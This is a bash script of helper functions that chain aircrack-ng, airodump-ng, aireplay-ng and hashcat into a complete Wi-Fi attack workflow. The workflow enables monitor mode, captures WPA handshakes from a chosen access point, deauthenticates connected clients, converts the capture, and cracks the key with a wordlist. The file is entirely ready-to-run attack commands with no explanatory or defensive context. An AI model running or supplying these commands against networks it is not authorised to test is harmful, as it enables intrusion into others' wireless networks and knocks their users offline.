#!/bin/bash

WIFIMon() { sudo airmon-ng check kill; sudo airmon-ng start $1; export WifiInt=$1"mon"; }
WIFIMonStop() { sudo airmon-ng stop $WifiInt; sleep 2; sudo service NetworkManager restart; }
WIFIList() { sudo airodump-ng -M -U -W $WifiInt; }
WIFICap() { export WifiBSSID=$1 && export WifiChan=$2; sudo airodump-ng -c $WifiChan --bssid $WifiBSSID -w capture $WifiInt --output-format pcap,; }
WIFIDeauth() { export WifiBSSID=$1 && export WifiChan=$2; sudo aireplay-ng -0 10 -a $WifiBSSID $WifiInt; }
WIFIConv() { CapFile=$1; aircrack-ng -j $CapFile $CapFile; }
WIFICrack() { HccapxFile=$1 WordlistFile=$2 ; sudo hashcat -m 2500 $HccapxFile $WordlistFile; }